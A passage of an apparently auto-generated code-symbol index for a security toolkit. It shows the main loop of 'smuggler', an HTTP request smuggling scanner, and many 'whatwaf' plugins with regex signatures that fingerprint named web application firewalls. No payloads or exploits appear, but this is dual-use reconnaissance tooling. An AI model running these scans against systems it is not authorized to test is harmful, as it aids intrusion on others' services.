        "peekOfCode": "\t\tServers = sys.stdin.read().split(\"\\n\")\n\telse:\n\t\tServers = [Args.url + \" \" + Args.method]\n\tFileHandle = None\n\tif Args.log is not None:\n\t\ttry:\n\t\t\tFileHandle = open(Args.log, \"w\")\n\t\texcept:\n\t\t\tprint_info(\"Error: Issue with log file destination\")\n\t\t\tprint(Parser.print_help())",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tServers",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tServers = [Args.url + \" \" + Args.method]\n\tFileHandle = None\n\tif Args.log is not None:\n\t\ttry:\n\t\t\tFileHandle = open(Args.log, \"w\")\n\t\texcept:\n\t\t\tprint_info(\"Error: Issue with log file destination\")\n\t\t\tprint(Parser.print_help())\n\t\t\tsys.exit(1)\n\tfor server in Servers:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\tFileHandle",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\tFileHandle = None\n\tif Args.log is not None:\n\t\ttry:\n\t\t\tFileHandle = open(Args.log, \"w\")\n\t\texcept:\n\t\t\tprint_info(\"Error: Issue with log file destination\")\n\t\t\tprint(Parser.print_help())\n\t\t\tsys.exit(1)\n\tfor server in Servers:\n\t\t# If the next on the list is blank, continue",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tFileHandle",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tFileHandle = open(Args.log, \"w\")\n\t\texcept:\n\t\t\tprint_info(\"Error: Issue with log file destination\")\n\t\t\tprint(Parser.print_help())\n\t\t\tsys.exit(1)\n\tfor server in Servers:\n\t\t# If the next on the list is blank, continue\n\t\tif server == \"\":\n\t\t\tcontinue\n\t\t# Tokenize",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tserver",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tserver = server.split(\" \")\n\t\t# This is for the stdin case, if no method was specified default to GET\n\t\tif len(server) == 1:\n\t\t\tserver += [Args.method]\n\t\t# If a protocol is not specified then default to https\n\t\tif server[0].lower().strip()[0:4] != \"http\":\n\t\t\tserver[0] = \"https://\" + server[0]\n\t\thost, port, endpoint, SSLFlagval = process_uri(server[0])\n\t\tmethod = server[1].upper()\n\t\tconfigfile = Args.configfile",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tserver[0]",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tserver[0] = \"https://\" + server[0]\n\t\thost, port, endpoint, SSLFlagval = process_uri(server[0])\n\t\tmethod = server[1].upper()\n\t\tconfigfile = Args.configfile\n\t\tprint_info(\"URL        : %s\"%(Fore.CYAN + server[0]), FileHandle)\n\t\tprint_info(\"Method     : %s\"%(Fore.CYAN + method), FileHandle)\n\t\tprint_info(\"Endpoint   : %s\"%(Fore.CYAN + endpoint), FileHandle)\n\t\tprint_info(\"Configfile : %s\"%(Fore.CYAN + configfile), FileHandle)\n\t\tprint_info(\"Timeout    : %s\"%(Fore.CYAN + str(float(Args.timeout)) + Fore.MAGENTA + \" seconds\"), FileHandle)\n\t\tsm = Desyncr(configfile, host, port, url=server[0], method=method, endpoint=endpoint, SSLFlag=SSLFlagval, logh=FileHandle, smargs=Args)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tmethod",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tmethod = server[1].upper()\n\t\tconfigfile = Args.configfile\n\t\tprint_info(\"URL        : %s\"%(Fore.CYAN + server[0]), FileHandle)\n\t\tprint_info(\"Method     : %s\"%(Fore.CYAN + method), FileHandle)\n\t\tprint_info(\"Endpoint   : %s\"%(Fore.CYAN + endpoint), FileHandle)\n\t\tprint_info(\"Configfile : %s\"%(Fore.CYAN + configfile), FileHandle)\n\t\tprint_info(\"Timeout    : %s\"%(Fore.CYAN + str(float(Args.timeout)) + Fore.MAGENTA + \" seconds\"), FileHandle)\n\t\tsm = Desyncr(configfile, host, port, url=server[0], method=method, endpoint=endpoint, SSLFlag=SSLFlagval, logh=FileHandle, smargs=Args)\n\t\tsm.run()\n\tif FileHandle is not None:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tconfigfile",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tconfigfile = Args.configfile\n\t\tprint_info(\"URL        : %s\"%(Fore.CYAN + server[0]), FileHandle)\n\t\tprint_info(\"Method     : %s\"%(Fore.CYAN + method), FileHandle)\n\t\tprint_info(\"Endpoint   : %s\"%(Fore.CYAN + endpoint), FileHandle)\n\t\tprint_info(\"Configfile : %s\"%(Fore.CYAN + configfile), FileHandle)\n\t\tprint_info(\"Timeout    : %s\"%(Fore.CYAN + str(float(Args.timeout)) + Fore.MAGENTA + \" seconds\"), FileHandle)\n\t\tsm = Desyncr(configfile, host, port, url=server[0], method=method, endpoint=endpoint, SSLFlag=SSLFlagval, logh=FileHandle, smargs=Args)\n\t\tsm.run()\n\tif FileHandle is not None:\n\t\tFileHandle.close()",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tsm",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tsm = Desyncr(configfile, host, port, url=server[0], method=method, endpoint=endpoint, SSLFlag=SSLFlagval, logh=FileHandle, smargs=Args)\n\t\tsm.run()\n\tif FileHandle is not None:\n\t\tFileHandle.close()",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.360",
        "description": "tools.whatwaf.content.plugins.360",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\".wzws.waf.cgi.\", re.I),\n        re.compile(r\"wangzhan\\.360\\.cn\", re.I),\n        re.compile(r\"qianxin.waf\", re.I),\n        re.compile(r\"360wzws\"),\n        re.compile(r\"transfer.is.blocked\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.360",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.360",
        "description": "tools.whatwaf.content.plugins.360",
        "peekOfCode": "__product__ = \"360 Web Application Firewall (360)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\".wzws.waf.cgi.\", re.I),\n        re.compile(r\"wangzhan\\.360\\.cn\", re.I),\n        re.compile(r\"qianxin.waf\", re.I),\n        re.compile(r\"360wzws\"),\n        re.compile(r\"transfer.is.blocked\", re.I)",
        "detail": "tools.whatwaf.content.plugins.360",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.aesecure",
        "description": "tools.whatwaf.content.plugins.aesecure",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"aesecure.denied.png\", re.I),\n    )\n    header_check = (\n        headers.get(\"aeSecure-code\", \"\"),\n        headers.get(\"AeSecure-Code\", \"\"),\n        headers.get(\"aesecure-code\", \"\")",
        "detail": "tools.whatwaf.content.plugins.aesecure",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.aesecure",
        "description": "tools.whatwaf.content.plugins.aesecure",
        "peekOfCode": "__product__ = \"aeSecure (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"aesecure.denied.png\", re.I),\n    )\n    header_check = (\n        headers.get(\"aeSecure-code\", \"\"),\n        headers.get(\"AeSecure-Code\", \"\"),",
        "detail": "tools.whatwaf.content.plugins.aesecure",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.airlock",
        "description": "tools.whatwaf.content.plugins.airlock",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\Aal[.-]?(sess|lb)=?\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SET_COOKIE, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.airlock",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.airlock",
        "description": "tools.whatwaf.content.plugins.airlock",
        "peekOfCode": "__product__ = \"Airlock (Phion/Ergon)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\Aal[.-]?(sess|lb)=?\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SET_COOKIE, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.airlock",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.akamai",
        "description": "tools.whatwaf.content.plugins.akamai",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>access.denied<.\", re.I),\n        re.compile(r\"akamaighost\", re.I),\n        re.compile(r\"ak.bmsc.\")\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.akamai",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.akamai",
        "description": "tools.whatwaf.content.plugins.akamai",
        "peekOfCode": "__product__ = \"AkamaiGHost Website Protection (Akamai Global Host)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>access.denied<.\", re.I),\n        re.compile(r\"akamaighost\", re.I),\n        re.compile(r\"ak.bmsc.\")\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.akamai",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.alertlogic",
        "description": "tools.whatwaf.content.plugins.alertlogic",
        "peekOfCode": "def detect(content, **kwargs):\n    detection_count = 0\n    detection_schema = (\n        re.compile(r\".>requested.url.cannot.be.found<.\", re.I),\n        re.compile(r\"proceed.to.homepage\", re.I),\n        re.compile(r\"back.to.previous.page\", re.I),\n        re.compile(r\"we('re|.are)?sorry.{1,2}but.the.page.you.are.looking.for.cannot\", re.I),\n        re.compile(r\"reference.id.?\", re.I),\n        re.compile(r\"page.has.either.been.removed.{1,2}renamed\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.alertlogic",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.alertlogic",
        "description": "tools.whatwaf.content.plugins.alertlogic",
        "peekOfCode": "__product__ = \"Alert Logic (SIEMless Threat Management)\"\ndef detect(content, **kwargs):\n    detection_count = 0\n    detection_schema = (\n        re.compile(r\".>requested.url.cannot.be.found<.\", re.I),\n        re.compile(r\"proceed.to.homepage\", re.I),\n        re.compile(r\"back.to.previous.page\", re.I),\n        re.compile(r\"we('re|.are)?sorry.{1,2}but.the.page.you.are.looking.for.cannot\", re.I),\n        re.compile(r\"reference.id.?\", re.I),\n        re.compile(r\"page.has.either.been.removed.{1,2}renamed\", re.I)",
        "detail": "tools.whatwaf.content.plugins.alertlogic",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.aliyundun",
        "description": "tools.whatwaf.content.plugins.aliyundun",
        "peekOfCode": "def detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    if status is not None and status == 405:\n        detection_schema = (\n            re.compile(r\"error(s)?.aliyun(dun)?.(com|net)\", re.I),\n            re.compile(r\"http(s)?://(www.)?aliyun.(com|net)\", re.I)\n        )\n        for detection in detection_schema:\n            if detection.search(content) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.aliyundun",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.aliyundun",
        "description": "tools.whatwaf.content.plugins.aliyundun",
        "peekOfCode": "__product__ = \"AliYunDun (WAF)\"\ndef detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    if status is not None and status == 405:\n        detection_schema = (\n            re.compile(r\"error(s)?.aliyun(dun)?.(com|net)\", re.I),\n            re.compile(r\"http(s)?://(www.)?aliyun.(com|net)\", re.I)\n        )\n        for detection in detection_schema:\n            if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.aliyundun",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.anquanbao",
        "description": "tools.whatwaf.content.plugins.anquanbao",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_scehmas = (\n        re.compile(r\".aqb_cc.error.\"),\n    )\n    if headers is not None:\n        for detection in detection_scehmas:\n            if detection.search(content) is not None:\n                return True",
        "detail": "tools.whatwaf.content.plugins.anquanbao",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.anquanbao",
        "description": "tools.whatwaf.content.plugins.anquanbao",
        "peekOfCode": "__product__ = \"Anquanbao Web Application Firewall (Anquanbao)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_scehmas = (\n        re.compile(r\".aqb_cc.error.\"),\n    )\n    if headers is not None:\n        for detection in detection_scehmas:\n            if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.anquanbao",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.anyu",
        "description": "tools.whatwaf.content.plugins.anyu",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"sorry.{1,2}your.access.has.been.intercept(ed)?.by.anyu\", re.I),\n        re.compile(r\"anyu\", re.I),\n        re.compile(r\"anyu-?.the.green.channel\", re.I)\n    )\n    try:\n        event_id = headers[\"WZWS-RAY\"] if headers is not None else None",
        "detail": "tools.whatwaf.content.plugins.anyu",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.anyu",
        "description": "tools.whatwaf.content.plugins.anyu",
        "peekOfCode": "__product__ = \"AnYu Web Application Firewall (Anyu Technologies)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"sorry.{1,2}your.access.has.been.intercept(ed)?.by.anyu\", re.I),\n        re.compile(r\"anyu\", re.I),\n        re.compile(r\"anyu-?.the.green.channel\", re.I)\n    )\n    try:",
        "detail": "tools.whatwaf.content.plugins.anyu",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.apachegeneric",
        "description": "tools.whatwaf.content.plugins.apachegeneric",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"apache\", re.I),\n        re.compile(r\".>you.don.t.have.permission.to.access+\", re.I),\n        re.compile(r\"was.not.found.on.this.server\", re.I),\n        re.compile(r\"<address>apache/([\\d+{1,2}](.[\\d+]{1,2}(.[\\d+]{1,3})?)?)?\", re.I),\n        re.compile(r\"<title>403 Forbidden</title>\", re.I)",
        "detail": "tools.whatwaf.content.plugins.apachegeneric",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.apachegeneric",
        "description": "tools.whatwaf.content.plugins.apachegeneric",
        "peekOfCode": "__product__ = \"Apache Generic\"\ndef detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"apache\", re.I),\n        re.compile(r\".>you.don.t.have.permission.to.access+\", re.I),\n        re.compile(r\"was.not.found.on.this.server\", re.I),\n        re.compile(r\"<address>apache/([\\d+{1,2}](.[\\d+]{1,2}(.[\\d+]{1,3})?)?)?\", re.I),",
        "detail": "tools.whatwaf.content.plugins.apachegeneric",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.armor",
        "description": "tools.whatwaf.content.plugins.armor",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"\\barmor\\b\", re.I),\n        re.compile(r\"blocked.by.website.protection.from.armour\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.armor",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.armor",
        "description": "tools.whatwaf.content.plugins.armor",
        "peekOfCode": "__product__ = \"Armor Protection (Armor Defense)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"\\barmor\\b\", re.I),\n        re.compile(r\"blocked.by.website.protection.from.armour\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.armor",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.asm",
        "description": "tools.whatwaf.content.plugins.asm",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"the.requested.url.was.rejected..please.consult.with.your.administrator.\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.asm",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.asm",
        "description": "tools.whatwaf.content.plugins.asm",
        "peekOfCode": "__product__ = \"Application Security Manager (F5 Networks)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"the.requested.url.was.rejected..please.consult.with.your.administrator.\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.asm",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.aspgeneric",
        "description": "tools.whatwaf.content.plugins.aspgeneric",
        "peekOfCode": "def detect(content, **kwargs):\n    detected = 0\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"this.generic.403.error.means.that.the.authenticated\", re.I),\n        re.compile(r\"request.could.not.be.understood\", re.I),\n        re.compile(r\"<.+>a.potentially.dangerous.request(.querystring)?.+\", re.I),\n        re.compile(r\"runtime.error\", re.I),\n        re.compile(r\".>a.potentially.dangerous.request.path.value.was.detected.from.the.client+\", re.I),",
        "detail": "tools.whatwaf.content.plugins.aspgeneric",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.aspgeneric",
        "description": "tools.whatwaf.content.plugins.aspgeneric",
        "peekOfCode": "__product__ = \"ASP.NET Generic Website Protection (Microsoft)\"\ndef detect(content, **kwargs):\n    detected = 0\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"this.generic.403.error.means.that.the.authenticated\", re.I),\n        re.compile(r\"request.could.not.be.understood\", re.I),\n        re.compile(r\"<.+>a.potentially.dangerous.request(.querystring)?.+\", re.I),\n        re.compile(r\"runtime.error\", re.I),",
        "detail": "tools.whatwaf.content.plugins.aspgeneric",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.ats",
        "description": "tools.whatwaf.content.plugins.ats",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    if headers is not None:\n        detection_schema = (\n            re.compile(r\"(\\()?apachetrafficserver((\\/)?\\d+(.\\d+(.\\d+)?)?)\", re.I),\n            re.compile(r\"ats((\\/)?(\\d+(.\\d+(.\\d+)?)?))?\", re.I),\n            re.compile(r\"ats\", re.I)\n        )\n        via = headers.get(HTTP_HEADER.VIA, \"\")\n        server = headers.get(HTTP_HEADER.SERVER, \"\")",
        "detail": "tools.whatwaf.content.plugins.ats",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.ats",
        "description": "tools.whatwaf.content.plugins.ats",
        "peekOfCode": "__product__ = \"Apache Traffic Server (ATS web proxy)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    if headers is not None:\n        detection_schema = (\n            re.compile(r\"(\\()?apachetrafficserver((\\/)?\\d+(.\\d+(.\\d+)?)?)\", re.I),\n            re.compile(r\"ats((\\/)?(\\d+(.\\d+(.\\d+)?)?))?\", re.I),\n            re.compile(r\"ats\", re.I)\n        )\n        via = headers.get(HTTP_HEADER.VIA, \"\")",
        "detail": "tools.whatwaf.content.plugins.ats",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.aws",
        "description": "tools.whatwaf.content.plugins.aws",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"<RequestId>[0-9a-zA-Z]{16,25}<.RequestId>\", re.I),\n        re.compile(r\"<Error><Code>AccessDenied<.Code>\", re.I),\n        re.compile(r\"x.amz.id.\\d+\", re.I),\n        re.compile(r\"x.amz.request.id\", re.I),\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.aws",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.aws",
        "description": "tools.whatwaf.content.plugins.aws",
        "peekOfCode": "__product__ = \"Amazon Web Services Web Application Firewall (Amazon)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"<RequestId>[0-9a-zA-Z]{16,25}<.RequestId>\", re.I),\n        re.compile(r\"<Error><Code>AccessDenied<.Code>\", re.I),\n        re.compile(r\"x.amz.id.\\d+\", re.I),\n        re.compile(r\"x.amz.request.id\", re.I),\n    )",
        "detail": "tools.whatwaf.content.plugins.aws",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.baidu",
        "description": "tools.whatwaf.content.plugins.baidu",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"fh(l)?\", re.I),\n        re.compile(r\"yunjiasu.nginx\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.X_SERVER, \"\")) is not None:\n            return True\n        if detection.search(headers.get(HTTP_HEADER.SERVER, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.baidu",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.baidu",
        "description": "tools.whatwaf.content.plugins.baidu",
        "peekOfCode": "__product__ = \"Yunjiasu Web Application Firewall (Baidu)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"fh(l)?\", re.I),\n        re.compile(r\"yunjiasu.nginx\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.X_SERVER, \"\")) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.baidu",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.barikode",
        "description": "tools.whatwaf.content.plugins.barikode",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>barikode<.\", re.I),\n        re.compile(r\"<h\\d{1}>forbidden.access<.h\\d{1}>\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.barikode",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.barikode",
        "description": "tools.whatwaf.content.plugins.barikode",
        "peekOfCode": "__product__ = \"Barikode Web Application Firewall\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>barikode<.\", re.I),\n        re.compile(r\"<h\\d{1}>forbidden.access<.h\\d{1}>\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.barikode",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.barracuda",
        "description": "tools.whatwaf.content.plugins.barracuda",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"\\Abarra.counter.session=?\", re.I),\n        re.compile(r\"(\\A|\\b)?barracuda.\", re.I),\n        re.compile(r\"barracuda.networks.{1,2}inc\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(headers.get(HTTP_HEADER.SET_COOKIE, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.barracuda",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.barracuda",
        "description": "tools.whatwaf.content.plugins.barracuda",
        "peekOfCode": "__product__ = \"Barracuda Web Application Firewall (Barracuda Networks)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"\\Abarra.counter.session=?\", re.I),\n        re.compile(r\"(\\A|\\b)?barracuda.\", re.I),\n        re.compile(r\"barracuda.networks.{1,2}inc\", re.I)\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.barracuda",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.bekchy",
        "description": "tools.whatwaf.content.plugins.bekchy",
        "peekOfCode": "def detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"bekchy.(-.)?access.denied\", re.I),\n        re.compile(r\"(http(s)?://)(www.)?bekchy.com(/report)?\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.bekchy",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.bekchy",
        "description": "tools.whatwaf.content.plugins.bekchy",
        "peekOfCode": "__product__ = \"Bekchy (WAF)\"\ndef detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"bekchy.(-.)?access.denied\", re.I),\n        re.compile(r\"(http(s)?://)(www.)?bekchy.com(/report)?\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.bekchy",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.bigip",
        "description": "tools.whatwaf.content.plugins.bigip",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\ATS\\w{4,}=\", re.I),\n        re.compile(r\"bigipserver(.i)?|bigipserverinternal\", re.I),\n        re.compile(r\"\\AF5\\Z\", re.I),\n        re.compile(r\"^TS[a-zA-Z0-9]{3,8}=\", re.I),\n        re.compile(r\"BigIP|BIG-IP|BIGIP\"),\n        re.compile(r\"bigipserver\", re.I),\n    )",
        "detail": "tools.whatwaf.content.plugins.bigip",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.bigip",
        "description": "tools.whatwaf.content.plugins.bigip",
        "peekOfCode": "__product__ = \"BIG-IP (F5 Networks)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"\\ATS\\w{4,}=\", re.I),\n        re.compile(r\"bigipserver(.i)?|bigipserverinternal\", re.I),\n        re.compile(r\"\\AF5\\Z\", re.I),\n        re.compile(r\"^TS[a-zA-Z0-9]{3,8}=\", re.I),\n        re.compile(r\"BigIP|BIG-IP|BIGIP\"),\n        re.compile(r\"bigipserver\", re.I),",
        "detail": "tools.whatwaf.content.plugins.bigip",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.binarysec",
        "description": "tools.whatwaf.content.plugins.binarysec",
